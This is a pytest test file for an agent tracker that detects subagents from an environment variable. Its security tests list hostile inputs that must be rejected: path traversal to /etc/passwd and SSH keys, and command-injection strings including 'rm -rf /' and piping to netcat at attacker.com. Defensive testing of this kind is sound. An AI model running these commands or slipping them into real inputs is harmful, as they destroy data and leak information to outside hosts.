#!/usr/bin/env python3
"""
TDD Tests for SubagentStop Task Tool Detection (FAILING - Red Phase)

This module contains FAILING tests for Issue #57 - Agent tracker doesn't detect
Task tool agent execution. Tests verify that the SubagentStop hook can auto-detect
agents invoked via Task tool by reading CLAUDE_AGENT_NAME environment variable.

Requirements (from implementation plan):
1. AgentTracker.is_agent_tracked() - Check if agent already tracked in session
2. AgentTracker.auto_track_from_environment() - Auto-detect from CLAUDE_AGENT_NAME
3. AgentTracker.complete_agent() idempotent - Safe to call multiple times
4. detect_and_track_agent() in auto_update_project_progress.py hook
5. Security validation for all inputs (path traversal, invalid names)

Test Strategy:
- Unit tests for individual methods (is_agent_tracked, auto_track_from_environment)
- Integration with existing complete_agent() method (idempotency)
- Security tests for malicious environment variables
- Edge cases: missing vars, empty strings, duplicates, concurrent calls

Test Coverage Target: 100% of new Task tool detection code paths

Following TDD principles:
- Write tests FIRST (red phase)
- Tests describe new requirements
- Tests should FAIL until implementation is complete
- Each test validates ONE requirement

Author: test-master agent
Date: 2025-11-09
Issue: #57
"""

import json
import os
import sys
import tempfile
from datetime import datetime
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

import pytest

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from scripts.agent_tracker import AgentTracker

# Note: security_utils uses ValueError for validation errors, not custom exception


class TestAgentTrackerIsAgentTracked:
    """Test AgentTracker.is_agent_tracked() method for duplicate detection.

    This method checks if an agent is already tracked in the current session,
    preventing duplicate entries when agents are invoked via Task tool.
    """

    @pytest.fixture
    def temp_session_dir(self, tmp_path):
        """Create temporary session directory."""
        session_dir = tmp_path / "docs" / "sessions"
        session_dir.mkdir(parents=True)
        return session_dir

    @pytest.fixture
    def session_file(self, temp_session_dir):
        """Create session file with sample data."""
        session_file = temp_session_dir / "test-session.json"
        session_data = {
            "session_id": "test-20251109-120000",
            "started": "2025-11-09T12:00:00",
            "agents": [
                {
                    "agent": "researcher",
                    "status": "started",
                    "started_at": "2025-11-09T12:01:00",
                    "message": "Researching patterns"
                },
                {
                    "agent": "planner",
                    "status": "completed",
                    "started_at": "2025-11-09T12:05:00",
                    "completed_at": "2025-11-09T12:10:00",
                    "duration_seconds": 300,
                    "message": "Plan created"
                }
            ]
        }
        session_file.write_text(json.dumps(session_data, indent=2))
        return session_file

    def test_is_agent_tracked_returns_true_for_tracked_agent(self, session_file):
        """Test is_agent_tracked() returns True for agent in session.

        Expected: researcher (started) and planner (completed) both return True.
        """
        tracker = AgentTracker(session_file=str(session_file))

        # Both started and completed agents should be tracked
        assert tracker.is_agent_tracked("researcher") is True
        assert tracker.is_agent_tracked("planner") is True

    def test_is_agent_tracked_returns_false_for_untracked_agent(self, session_file):
        """Test is_agent_tracked() returns False for agent not in session.

        Expected: test-master not in session, returns False.
        """
        tracker = AgentTracker(session_file=str(session_file))

        assert tracker.is_agent_tracked("test-master") is False
        assert tracker.is_agent_tracked("implementer") is False

    def test_is_agent_tracked_returns_false_for_empty_session(self, temp_session_dir):
        """Test is_agent_tracked() returns False for empty session.

        Expected: No agents in session, all queries return False.
        """
        session_file = temp_session_dir / "empty-session.json"
        session_data = {
            "session_id": "test-20251109-120000",
            "started": "2025-11-09T12:00:00",
            "agents": []
        }
        session_file.write_text(json.dumps(session_data, indent=2))

        tracker = AgentTracker(session_file=str(session_file))

        assert tracker.is_agent_tracked("researcher") is False
        assert tracker.is_agent_tracked("planner") is False

    def test_is_agent_tracked_validates_agent_name(self, session_file):
        """Test is_agent_tracked() validates agent name input.

        SECURITY: Prevent injection via malformed agent names.
        Expected: ValueError for invalid names.
        """
        tracker = AgentTracker(session_file=str(session_file))

        # Invalid characters
        with pytest.raises(ValueError):
            tracker.is_agent_tracked("../../etc/passwd")

        # Empty string
        with pytest.raises(ValueError):
            tracker.is_agent_tracked("")

        # Too long (> 255 chars)
        with pytest.raises(ValueError):
            tracker.is_agent_tracked("a" * 256)

    def test_is_agent_tracked_case_sensitive(self, session_file):
        """Test is_agent_tracked() is case-sensitive.

        Expected: "researcher" != "Researcher" != "RESEARCHER"
        """
        tracker = AgentTracker(session_file=str(session_file))

        assert tracker.is_agent_tracked("researcher") is True
        assert tracker.is_agent_tracked("Researcher") is False
        assert tracker.is_agent_tracked("RESEARCHER") is False


class TestAgentTrackerAutoTrackFromEnvironment:
    """Test AgentTracker.auto_track_from_environment() for Task tool detection.

    This method reads CLAUDE_AGENT_NAME from environment and auto-starts tracking
    if the agent is not already tracked.
    """

    @pytest.fixture
    def temp_session_dir(self, tmp_path):
        """Create temporary session directory."""
        session_dir = tmp_path / "docs" / "sessions"
        session_dir.mkdir(parents=True)
        return session_dir

    @pytest.fixture
    def session_file(self, temp_session_dir):
        """Create empty session file."""
        session_file = temp_session_dir / "test-session.json"
        session_data = {
            "session_id": "test-20251109-120000",
            "started": "2025-11-09T12:00:00",
            "agents": []
        }
        session_file.write_text(json.dumps(session_data, indent=2))
        return session_file

    def test_auto_track_from_environment_detects_task_tool_agent(self, session_file):
        """Test auto_track_from_environment() detects agent from CLAUDE_AGENT_NAME.

        Expected: Reads env var, starts tracking if not already tracked.
        """
        tracker = AgentTracker(session_file=str(session_file))

        # Set environment variable
        with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": "researcher"}):
            result = tracker.auto_track_from_environment(
                message="Auto-detected from Task tool"
            )

        # Should return True (agent was tracked)
        assert result is True

        # Verify agent was added to session
        assert tracker.is_agent_tracked("researcher") is True

        # Verify session file contains agent
        session_data = json.loads(session_file.read_text())
        agents = session_data.get("agents", [])
        assert len(agents) == 1
        assert agents[0]["agent"] == "researcher"
        assert agents[0]["status"] == "started"
        assert "Auto-detected from Task tool" in agents[0]["message"]

    def test_auto_track_from_environment_returns_false_if_already_tracked(self, temp_session_dir):
        """Test auto_track_from_environment() returns False if agent already tracked.

        Expected: No duplicate entry created, returns False.
        """
        session_file = temp_session_dir / "test-session.json"
        session_data = {
            "session_id": "test-20251109-120000",
            "started": "2025-11-09T12:00:00",
            "agents": [
                {
                    "agent": "researcher",
                    "status": "started",
                    "started_at": "2025-11-09T12:01:00",
                    "message": "Already started"
                }
            ]
        }
        session_file.write_text(json.dumps(session_data, indent=2))

        tracker = AgentTracker(session_file=str(session_file))

        # Try to auto-track same agent
        with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": "researcher"}):
            result = tracker.auto_track_from_environment(
                message="Duplicate attempt"
            )

        # Should return False (agent already tracked)
        assert result is False

        # Verify no duplicate entry created
        session_data = json.loads(session_file.read_text())
        agents = session_data.get("agents", [])
        assert len(agents) == 1  # Still only 1 entry
        assert agents[0]["message"] == "Already started"  # Original message preserved

    def test_auto_track_from_environment_returns_false_if_env_var_missing(self, session_file):
        """Test auto_track_from_environment() returns False if CLAUDE_AGENT_NAME not set.

        Expected: No error raised, returns False gracefully.
        """
        tracker = AgentTracker(session_file=str(session_file))

        # Ensure env var is not set
        with patch.dict(os.environ, {}, clear=True):
            result = tracker.auto_track_from_environment(
                message="This should not be tracked"
            )

        # Should return False
        assert result is False

        # Verify no agent added
        session_data = json.loads(session_file.read_text())
        agents = session_data.get("agents", [])
        assert len(agents) == 0

    def test_auto_track_from_environment_validates_env_var_value(self, session_file):
        """Test auto_track_from_environment() validates CLAUDE_AGENT_NAME value.

        SECURITY: Prevent injection via malicious environment variable.
        Expected: ValueError for invalid names.
        """
        tracker = AgentTracker(session_file=str(session_file))

        # Path traversal attempt
        with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": "../../etc/passwd"}):
            with pytest.raises(ValueError):
                tracker.auto_track_from_environment(message="Malicious")

        # Empty string
        with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": ""}):
            with pytest.raises(ValueError):
                tracker.auto_track_from_environment(message="Empty")

        # Too long
        with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": "a" * 256}):
            with pytest.raises(ValueError):
                tracker.auto_track_from_environment(message="Too long")

    def test_auto_track_from_environment_validates_message_parameter(self, session_file):
        """Test auto_track_from_environment() validates message parameter.

        SECURITY: Prevent log injection via message field.
        Expected: ValueError for messages > 10KB.
        """
        tracker = AgentTracker(session_file=str(session_file))

        # Message too long (> 10KB)
        with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": "researcher"}):
            with pytest.raises(ValueError):
                tracker.auto_track_from_environment(message="x" * 10241)

    def test_auto_track_from_environment_uses_default_message(self, session_file):
        """Test auto_track_from_environment() uses default message if not provided.

        Expected: Default message includes "Auto-detected via Task tool".
        """
        tracker = AgentTracker(session_file=str(session_file))

        with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": "planner"}):
            result = tracker.auto_track_from_environment()

        assert result is True

        # Check default message
        session_data = json.loads(session_file.read_text())
        agents = session_data.get("agents", [])
        assert len(agents) == 1
        assert "Auto-detected via Task tool" in agents[0]["message"]


class TestAgentTrackerCompleteAgentIdempotency:
    """Test AgentTracker.complete_agent() idempotency for Task tool safety.

    When agents are invoked via Task tool, complete_agent() may be called multiple
    times (once by Task tool, once by SubagentStop hook). Must handle gracefully.
    """

    @pytest.fixture
    def temp_session_dir(self, tmp_path):
        """Create temporary session directory."""
        session_dir = tmp_path / "docs" / "sessions"
        session_dir.mkdir(parents=True)
        return session_dir

    @pytest.fixture
    def session_file_with_started_agent(self, temp_session_dir):
        """Create session file with started agent."""
        session_file = temp_session_dir / "test-session.json"
        session_data = {
            "session_id": "test-20251109-120000",
            "started": "2025-11-09T12:00:00",
            "agents": [
                {
                    "agent": "researcher",
                    "status": "started",
                    "started_at": "2025-11-09T12:01:00",
                    "message": "Researching patterns"
                }
            ]
        }
        session_file.write_text(json.dumps(session_data, indent=2))
        return session_file

    def test_complete_agent_is_idempotent_for_first_call(self, session_file_with_started_agent):
        """Test complete_agent() works normally on first call.

        Expected: Agent status changes from 'started' to 'completed'.
        """
        tracker = AgentTracker(session_file=str(session_file_with_started_agent))

        # Complete the agent
        tracker.complete_agent("researcher", "Research complete")

        # Verify status changed
        session_data = json.loads(session_file_with_started_agent.read_text())
        agents = session_data.get("agents", [])
        assert len(agents) == 1
        assert agents[0]["agent"] == "researcher"
        assert agents[0]["status"] == "completed"
        assert agents[0]["message"] == "Research complete"
        assert "completed_at" in agents[0]
        assert "duration_seconds" in agents[0]

    def test_complete_agent_is_idempotent_for_second_call(self, session_file_with_started_agent):
        """Test complete_agent() is safe to call twice.

        Expected: Second call does nothing (no error, no data change).
        """
        tracker = AgentTracker(session_file=str(session_file_with_started_agent))

        # Complete the agent (first call)
        tracker.complete_agent("researcher", "First completion")

        # Get data after first call
        session_data_first = json.loads(session_file_with_started_agent.read_text())
        first_completed_at = session_data_first["agents"][0]["completed_at"]
        first_duration = session_data_first["agents"][0]["duration_seconds"]

        # Complete again (second call)
        tracker.complete_agent("researcher", "Second completion")

        # Verify data unchanged
        session_data_second = json.loads(session_file_with_started_agent.read_text())
        assert len(session_data_second["agents"]) == 1  # No duplicate
        assert session_data_second["agents"][0]["status"] == "completed"
        assert session_data_second["agents"][0]["message"] == "First completion"  # Original message preserved
        assert session_data_second["agents"][0]["completed_at"] == first_completed_at  # Timestamp unchanged
        assert session_data_second["agents"][0]["duration_seconds"] == first_duration  # Duration unchanged

    def test_complete_agent_handles_multiple_consecutive_calls(self, session_file_with_started_agent):
        """Test complete_agent() handles 3+ consecutive calls gracefully.

        Expected: All calls after first are no-ops.
        """
        tracker = AgentTracker(session_file=str(session_file_with_started_agent))

        # Call 5 times
        for i in range(5):
            tracker.complete_agent("researcher", f"Completion attempt {i+1}")

        # Verify only one completion recorded (first one)
        session_data = json.loads(session_file_with_started_agent.read_text())
        assert len(session_data["agents"]) == 1
        assert session_data["agents"][0]["status"] == "completed"
        assert session_data["agents"][0]["message"] == "Completion attempt 1"


class TestHookDetectAndTrackAgent:
    """Test detect_and_track_agent() function in auto_update_project_progress.py hook.

    This function is called by SubagentStop hook to auto-detect and track agents
    invoked via Task tool.
    """

    @pytest.fixture
    def temp_session_dir(self, tmp_path):
        """Create temporary session directory."""
        session_dir = tmp_path / "docs" / "sessions"
        session_dir.mkdir(parents=True)
        return session_dir

    @pytest.fixture
    def mock_agent_tracker(self):
        """Mock AgentTracker class."""
        with patch('scripts.agent_tracker.AgentTracker') as mock:
            yield mock

    def test_detect_and_track_agent_calls_auto_track_from_environment(
        self, temp_session_dir, mock_agent_tracker
    ):
        """Test detect_and_track_agent() invokes auto_track_from_environment().

        Expected: Creates AgentTracker instance and calls auto_track_from_environment().
        """
        # Import hook module
        sys.path.insert(0, str(Path(__file__).parent.parent.parent / ".claude" / "hooks"))
        from auto_update_project_progress import detect_and_track_agent

        session_file = temp_session_dir / "test-session.json"

        # Mock tracker instance
        mock_instance = MagicMock()
        mock_instance.auto_track_from_environment.return_value = True
        mock_agent_tracker.return_value = mock_instance

        # Call function
        result = detect_and_track_agent(str(session_file))

        # Verify AgentTracker was instantiated
        mock_agent_tracker.assert_called_once_with(session_file=str(session_file))

        # Verify auto_track_from_environment was called
        mock_instance.auto_track_from_environment.assert_called_once()

    def test_detect_and_track_agent_returns_true_if_agent_tracked(
        self, temp_session_dir, mock_agent_tracker
    ):
        """Test detect_and_track_agent() returns True if agent was tracked.

        Expected: Returns True when auto_track_from_environment() succeeds.
        """
        sys.path.insert(0, str(Path(__file__).parent.parent.parent / ".claude" / "hooks"))
        from auto_update_project_progress import detect_and_track_agent

        session_file = temp_session_dir / "test-session.json"

        # Mock success
        mock_instance = MagicMock()
        mock_instance.auto_track_from_environment.return_value = True
        mock_agent_tracker.return_value = mock_instance

        result = detect_and_track_agent(str(session_file))

        assert result is True

    def test_detect_and_track_agent_returns_false_if_agent_not_tracked(
        self, temp_session_dir, mock_agent_tracker
    ):
        """Test detect_and_track_agent() returns False if agent already tracked.

        Expected: Returns False when auto_track_from_environment() returns False.
        """
        sys.path.insert(0, str(Path(__file__).parent.parent.parent / ".claude" / "hooks"))
        from auto_update_project_progress import detect_and_track_agent

        session_file = temp_session_dir / "test-session.json"

        # Mock already tracked
        mock_instance = MagicMock()
        mock_instance.auto_track_from_environment.return_value = False
        mock_agent_tracker.return_value = mock_instance

        result = detect_and_track_agent(str(session_file))

        assert result is False

    def test_detect_and_track_agent_handles_errors_gracefully(
        self, temp_session_dir, mock_agent_tracker
    ):
        """Test detect_and_track_agent() handles errors without crashing hook.

        Expected: Returns False on error, doesn't raise exception.
        """
        sys.path.insert(0, str(Path(__file__).parent.parent.parent / ".claude" / "hooks"))
        from auto_update_project_progress import detect_and_track_agent

        session_file = temp_session_dir / "test-session.json"

        # Mock error
        mock_instance = MagicMock()
        mock_instance.auto_track_from_environment.side_effect = Exception("Simulated error")
        mock_agent_tracker.return_value = mock_instance

        # Should not raise exception
        result = detect_and_track_agent(str(session_file))

        # Should return False
        assert result is False


class TestSecurityValidation:
    """Test security validation for Task tool detection.

    All inputs from environment variables must be validated to prevent injection.
    """

    @pytest.fixture
    def temp_session_dir(self, tmp_path):
        """Create temporary session directory."""
        session_dir = tmp_path / "docs" / "sessions"
        session_dir.mkdir(parents=True)
        return session_dir

    @pytest.fixture
    def session_file(self, temp_session_dir):
        """Create empty session file."""
        session_file = temp_session_dir / "test-session.json"
        session_data = {
            "session_id": "test-20251109-120000",
            "started": "2025-11-09T12:00:00",
            "agents": []
        }
        session_file.write_text(json.dumps(session_data, indent=2))
        return session_file

    def test_malicious_agent_name_blocked(self, session_file):
        """Test path traversal in agent name is blocked.

        SECURITY: CWE-22 protection.
        Expected: ValueError raised.
        """
        tracker = AgentTracker(session_file=str(session_file))

        malicious_names = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "agent/../../etc/hosts",
            "agent/../../../tmp/evil"
        ]

        for name in malicious_names:
            with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": name}):
                with pytest.raises(ValueError):
                    tracker.auto_track_from_environment(message="Attack attempt")

    def test_script_injection_in_agent_name_blocked(self, session_file):
        """Test script injection in agent name is blocked.

        SECURITY: Prevent command injection.
        Expected: ValueError raised.
        """
        tracker = AgentTracker(session_file=str(session_file))

        malicious_names = [
            "agent; rm -rf /",
            "agent && echo 'pwned' > /tmp/evil",
            "agent | nc attacker.com 1234",
            "$(whoami)",
            "`whoami`"
        ]

        for name in malicious_names:
            with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": name}):
                with pytest.raises(ValueError):
                    tracker.auto_track_from_environment(message="Attack attempt")

    def test_oversized_message_blocked(self, session_file):
        """Test oversized message is blocked.

        SECURITY: Prevent log bloat DoS.
        Expected: ValueError raised.
        """
        tracker = AgentTracker(session_file=str(session_file))

        # Message > 10KB
        huge_message = "x" * 10241

        with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": "researcher"}):
            with pytest.raises(ValueError):
                tracker.auto_track_from_environment(message=huge_message)

    def test_null_byte_in_agent_name_blocked(self, session_file):
        """Test null byte in agent name is blocked.

        SECURITY: Prevent null byte injection.
        Expected: ValueError raised.
        """
        tracker = AgentTracker(session_file=str(session_file))

        # Null byte can truncate strings in some contexts
        with patch.dict(os.environ, {"CLAUDE_AGENT_NAME": "agent\x00evil"}):
            with pytest.raises(ValueError):
                tracker.auto_track_from_environment(message="Attack")


# Run tests if executed directly
if __name__ == "__main__":
    pytest.main([__file__, "-v"])
